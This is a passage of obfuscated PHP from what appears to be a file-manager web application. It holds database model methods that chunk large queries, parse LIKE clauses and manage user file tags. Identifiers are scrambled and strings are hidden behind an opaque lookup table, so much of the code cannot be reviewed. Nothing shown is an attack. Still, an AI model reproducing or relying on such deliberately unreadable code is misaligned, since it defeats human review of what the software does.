return $ö«ˆ‰ùÀ; } } return $÷ŸæÊÍø; } public function save($‰ø”Õ¹­ = '', $±˜‘ìè = array()) { $—ìõ«ÄŒ =& $_SERVER[ú÷îèÆÜ]; $ Ùñ¢í = self::SQL_WHERE_IN_CHUNK; $…½Í”¡§ = $this->optionsValue(); $Ò›Â‰• = $this->findWhereField($…½Í”¡§); if (!$Ò›Â‰•) { return parent::save($‰ø”Õ¹­, $±˜‘ìè); } $™’¥Ìö = 0; $·ãæ—şç = $…½Í”¡§[$—ìõ«ÄŒ[328]][$Ò›Â‰•][1]; $·ãæ—şç = is_array($·ãæ—şç) ? $·ãæ—şç : array(); $‡”–‹¡Ê = count($·ãæ—şç); for ($Î¦êœ™â = 0; $Î¦êœ™â < $‡”–‹¡Ê; $Î¦êœ™â += $ Ùñ¢í) { $£Ïë¡Ï = array_slice($·ãæ—şç, $Î¦êœ™â, $ Ùñ¢í); if (!is_array($£Ïë¡Ï) || count($£Ïë¡Ï) == 0) { break; } $…½Í”¡§[$—ìõ«ÄŒ[328]][$Ò›Â‰•][1] = $£Ïë¡Ï; $this->optionsValue($…½Í”¡§); $™’¥Ìö += parent::save($‰ø”Õ¹­, $±˜‘ìè); $this->chunkEventCheck(count($£Ïë¡Ï)); } $this->chunkEventSet(); return $™’¥Ìö; } public function add($ªáÍöß¥ = '', $ÎöìŸ€  = array(), $£ûÛ”‘½ = false) { if ($this->addTaskStatus && is_array($ªáÍöß¥)) { $this->addTaskData[] = $ªáÍöß¥; return; } return parent::add($ªáÍöß¥, $ÎöìŸ€ , $£ûÛ”‘½); } public function parseWhereLike($òÖüºè, $ñëëÑ¿Û = '', $şµÕ³¤³ = false, &$òå•†ğ† = false) { $¯õ“‚åÉ =& $_SERVER[ú÷îèÆÜ]; $Âôäó”„ = $GLOBALS[$¯õ“‚åÉ[16]][$¯õ“‚åÉ[434]]; if (!$Âôäó”„[$¯õ“‚åÉ[435]]) { return $òÖüºè; } if (!is_array($òÖüºè)) { return $òÖüºè; } $†ÉêæÏŒ = array(); $İ‰È¥ò = 0; foreach ($òÖüºè as $ïÜÑŒ“ => $ûÖ¸—¸×) { if (is_array($ûÖ¸—¸×) && count($ûÖ¸—¸×) == 2 && $ûÖ¸—¸×[0] == $¯õ“‚åÉ[436] && is_string($ûÖ¸—¸×[1]) && substr($ûÖ¸—¸×[1], 0, 1) == $¯õ“‚åÉ[437] && substr($ûÖ¸—¸×[1], strlen($ûÖ¸—¸×[1]) - 1, 1) == $¯õ“‚åÉ[437]) { $òå•†ğ† = !0; $·èË×Íó = is_string($ïÜÑŒ“) ? $ïÜÑŒ“ : $ñëëÑ¿Û; $¦Ë´ûÄ = substr($ûÖ¸—¸×[1], 1, strlen($ûÖ¸—¸×[1]) - 2); $¦Ë´ûÄ = $this->db->escapeString($¦Ë´ûÄ); if (!strpos($·èË×Íó, $¯õ“‚åÉ[20])) { $·èË×Íó = $¯õ“‚åÉ[438] . $·èË×Íó . $¯õ“‚åÉ[438]; } $Ä¨¥ß—Æ = $¯õ“‚åÉ[213] . $¦Ë´ûÄ . $¯õ“‚åÉ[213]; $¦Ë´ûÄ = str_replace(array($¯õ“‚åÉ[20], $¯õ“‚åÉ[439], $¯õ“‚åÉ[21]), $¯õ“‚åÉ[440], $¦Ë´ûÄ); if ($Âôäó”„[$¯õ“‚åÉ[441]]) { $Ä¨¥ß—Æ = $¯õ“‚åÉ[442] . $¦Ë´ûÄ . $¯õ“‚åÉ[443]; if ($Âôäó”„[$¯õ“‚åÉ[444]]) { $Ä¨¥ß—Æ = $¯õ“‚åÉ[443] . $¦Ë´ûÄ . $¯õ“‚åÉ[442]; } } $†ÉêæÏŒ[$İ‰È¥ò] = $¯õ“‚åÉ[445] . $·èË×Íó . $¯õ“‚åÉ[446] . $Ä¨¥ß—Æ . $¯õ“‚åÉ[447]; $İ‰È¥ò++; continue; } if (is_array($ûÖ¸—¸×)) { $ñëëÑ¿Û = is_string($ïÜÑŒ“) ? $ïÜÑŒ“ : $ñëëÑ¿Û; $ûÖ¸—¸× = $this->parseWhereLike($ûÖ¸—¸×, $ñëëÑ¿Û, !0, $òå•†ğ†); } if (is_numeric($ïÜÑŒ“)) { $†ÉêæÏŒ[$İ‰È¥ò] = $ûÖ¸—¸×; $İ‰È¥ò++; } else { $†ÉêæÏŒ[$ïÜÑŒ“] = $ûÖ¸—¸×; } } if ($òå•†ğ† && !$şµÕ³¤³) { } return $†ÉêæÏŒ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¿ÊÎ—½œ = array()) { $’óËÃ¿ =& $_SERVER[ú÷îèÆÜ]; $ì…šëÊÊ = self::SQL_WHERE_IN_CHUNK; $ƒß¹ô = $this->optionsValue(); $àä¢ Õü = $this->findWhereField($ƒß¹ô); if (!$àä¢ Õü || isset($ƒß¹ô[$’óËÃ¿[345]]) || isset($ƒß¹ô[$’óËÃ¿[406]])) { return parent::select($¿ÊÎ—½œ); } $€Ö…”©œ = $ƒß¹ô[$’óËÃ¿[328]][$àä¢ Õü][1]; $€Ö…”©œ = is_array($€Ö…”©œ) ? $€Ö…”©œ : array(); $ªŒŠî = null; for ($ŸªÇàÜ = 0; $ŸªÇàÜ < count($€Ö…”©œ); $ŸªÇàÜ += $ì…šëÊÊ) { $¨şÕ·áï = array_slice($€Ö…”©œ, $ŸªÇàÜ, $ì…šëÊÊ); if (!is_array($¨şÕ·áï) || count($¨şÕ·áï) == 0) { break; } $ƒß¹ô[$’óËÃ¿[328]][$àä¢ Õü][1] = $¨şÕ·áï; $this->optionsValue($ƒß¹ô); $üıÖ’˜Ó = parent::select($¿ÊÎ—½œ); if (!$üıÖ’˜Ó) { continue; } $ªŒŠî = is_array($ªŒŠî) ? $ªŒŠî : array(); $ªŒŠî = array_merge($ªŒŠî, $üıÖ’˜Ó); } return $ªŒŠî; } public function delete($«í®ë¤ = array()) { $ÎÛ÷éŸ¶ =& $_SERVER[ú÷îèÆÜ]; $’ã”¸• = self::SQL_WHERE_IN_CHUNK; $ú¼Ø°Û° = $this->optionsValue(); $Èİú„« = $this->findWhereField($ú¼Ø°Û°); if (!$Èİú„«) { return parent::delete($«í®ë¤); } $›«½›ú = 0; $í›ÇÒ¸ = $ú¼Ø°Û°[$ÎÛ÷éŸ¶[328]][$Èİú„«][1]; $í›ÇÒ¸ = is_array($í›ÇÒ¸) ? $í›ÇÒ¸ : array(); for ($ÖÊËá»ı = 0; $ÖÊËá»ı < count($í›ÇÒ¸); $ÖÊËá»ı += $’ã”¸•) { $íô¤¡¨Ù = array_slice($í›ÇÒ¸, $ÖÊËá»ı, $’ã”¸•); if (!is_array($íô¤¡¨Ù) || count($íô¤¡¨Ù) == 0) { break; } $ú¼Ø°Û°[$ÎÛ÷éŸ¶[328]][$Èİú„«][1] = $íô¤¡¨Ù; $this->optionsValue($ú¼Ø°Û°); $›«½›ú += parent::delete($«í®ë¤); } return $›«½›ú; } private function findWhereField($ª•ğáÇà) { $¶—ÙìÂ =& $_SERVER[ú÷îèÆÜ]; $Ì‹©À¬Ä = self::SQL_WHERE_IN_CHUNK; if (!is_array($ª•ğáÇà) || !is_array($ª•ğáÇà[$¶—ÙìÂ[328]])) { return !1; } foreach ($ª•ğáÇà[$¶—ÙìÂ[328]] as $±úòÎ¯¬ => $Ğñãã„) { if (is_array($Ğñãã„) && isset($Ğñãã„[0]) && is_string($Ğñãã„[0]) && strtolower($Ğñãã„[0]) == $¶—ÙìÂ[17] && is_array($Ğñãã„[1]) && count($Ğñãã„[1]) > $Ì‹©À¬Ä) { ignore_timeout(); return $±úòÎ¯¬; } } return !1; } public function setMasterDB($’åĞ½ı = true) { think_config($_SERVER[ú÷îèÆÜ][448], $’åĞ½ı); } } goto c¶éñì¯¥; Eùİ¢Á¯Ø‡: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($¹äÕÖ‹) { $ûÏıƒöì =& $_SERVER[ú÷îèÆÜ]; return array($ûÏıƒöì[1994] => array($ûÏıƒöì[2383] . USER_ID, $ûÏıƒöì[1995])); } protected function listData() { $ßØÅ‡í£ =& $_SERVER[ú÷îèÆÜ]; $ì„Ú¤½Ñ = array($ßØÅ‡í£[1676] => USER_ID, $ßØÅ‡í£[534] => array($ßØÅ‡í£[1998], 0)); $“ŒÒ³Ğ = $ßØÅ‡í£[2384]; $íÅİ«µ® = $this->field($“ŒÒ³Ğ)->where($ì„Ú¤½Ñ)->order($ßØÅ‡í£[2001])->select(); return $íÅİ«µ® ? $íÅİ«µ® : array(); } protected function addToTag($ÍÀÇ¬Óï, $•ñ“»²ö) { $Ù¼Ï˜Œï =& $_SERVER[ú÷îèÆÜ]; if (!Model($Ù¼Ï˜Œï[2143])->listData($•ñ“»²ö)) { return !1; } if (is_numeric($ÍÀÇ¬Óï)) { $£¥ŒõÍğ = Model($Ù¼Ï˜Œï[865])->pathInfo($ÍÀÇ¬Óï); if (!$£¥ŒõÍğ) { return !1; } } else { $£¥ŒõÍğ = IO::infoSimple($ÍÀÇ¬Óï); if (!$£¥ŒõÍğ) { return !1; } $Óº•¿ = $£¥ŒõÍğ[$Ù¼Ï˜Œï[42]]; $î¦ì× = $£¥ŒõÍğ[$Ù¼Ï˜Œï[43]]; if (isset($£¥ŒõÍğ[$Ù¼Ï˜Œï[462]])) { $î¦ì× = $£¥ŒõÍğ[$Ù¼Ï˜Œï[462]] == $Ù¼Ï˜Œï[98] ? $Ù¼Ï˜Œï[85] : $Ù¼Ï˜Œï[224]; } } $¸†ğÖËË = array($Ù¼Ï˜Œï[1676] => USER_ID, $Ù¼Ï˜Œï[534] => $•ñ“»²ö, $Ù¼Ï˜Œï[472] => $ÍÀÇ¬Óï, $Ù¼Ï˜Œï[473] => $î¦ì× ? $î¦ì× : $Ù¼Ï˜Œï[467], $Ù¼Ï˜Œï[471] => $Óº•¿ ? $Óº•¿ : $Ù¼Ï˜Œï[22], $Ù¼Ï˜Œï[1887] => 0); if ($this->where($¸†ğÖËË)->find()) { return !1; } return $this->add($¸†ğÖËË); } protected function removeFromTag($«äœ…ì½, $ö©©“¿ñ) { $œ ¥§´ =& $_SERVER[ú÷îèÆÜ]; if (!Model($œ ¥§´[2143])->listData($ö©©“¿ñ)) { return !1; } if (is_array($«äœ…ì½)) { $«äœ…ì½ = array($œ ¥§´[17], $«äœ…ì½); } $ÉíêÑµİ = array($œ ¥§´[1676] => USER_ID, $œ ¥§´[534] => $ö©©“¿ñ, $œ ¥§´[472] => $«äœ…ì½); return $this->where($ÉíêÑµİ)->delete(); } protected function removeByTag($ÅÂ¹»„™) { $ß¤‰ÇºÄ =& $_SERVER[ú÷îèÆÜ]; if (!$ÅÂ¹»„™) { return !1; } $½˜’çÌ = array($ß¤‰ÇºÄ[1676] => USER_ID, $ß¤‰ÇºÄ[534] => $ÅÂ¹»„™); return $this->where($½˜’çÌ)->delete(); } protected function removeBySource($ùíç¼Ù) { $óÂ³²ş¯ =& $_SERVER[ú÷îèÆÜ]; if (is_array($ùíç¼Ù)) { $ùíç¼Ù = array($óÂ³²ş¯[17], $ùíç¼Ù); } $ñÃ§“Ôñ = array($óÂ³²ş¯[1676] => USER_ID, $óÂ³²ş¯[534] => array($óÂ³²ş¯[1055], 0), $óÂ³²ş¯[472] => $ùíç¼Ù); return $this->where($ñÃ§“Ôñ)->delete(); } }